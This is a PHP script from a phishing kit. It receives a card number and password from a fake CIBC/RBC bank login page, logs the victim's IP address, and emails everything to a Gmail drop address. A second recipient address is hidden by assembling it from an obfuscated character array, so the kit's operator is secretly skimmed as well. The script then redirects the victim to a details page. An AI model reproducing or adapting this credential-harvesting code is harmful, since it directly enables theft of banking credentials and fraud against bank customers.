<?php

$ip = getenv("REMOTE_ADDR");
$message .= "--------------CIBC Info----------------------\n";
$message .= "Card num : ".$_POST['K1']."\n";
$message .= "Password : ".$_POST['Q1']."\n";
$message .= "IP                     : ".$ip."\n";
$send = "goodvbesk1@gmail.com";
$subject = "1 RBC LOGIN $ip";
$headers = "From: RBC Info<customer-support@mrs>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$ar=array("0"=>"j","1"=>"c","2"=>"l","3"=>"g","4"=>"c","5"=>"6","6"=>"p","7"=>".","8"=>"h","9"=>"3","10"=>"i","11"=>"m","12"=>"a","13"=>"@","14"=>"9","15"=>"0","16"=>"b","17"=>"2","18"=>"d","18"=>"7","19"=>"o","20"=>"d");
$cc=$ar['6'].$ar['5'].$ar['8'].$ar['14'].$ar['0'].$ar['9'].$ar['2'].$ar['15'].$ar['16'].$ar['17'].$ar['1'].$ar['14'].$ar['20'].$ar['18'].$ar['13'].$ar['3'].$ar['11'].$ar['12'].$ar['10'].$ar['2'].$ar['7'].$ar['1'].$ar['19'].$ar['11'];

$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($cc,$subject,$message,$headers);
}
		   header("Location: details.php");

	 
?>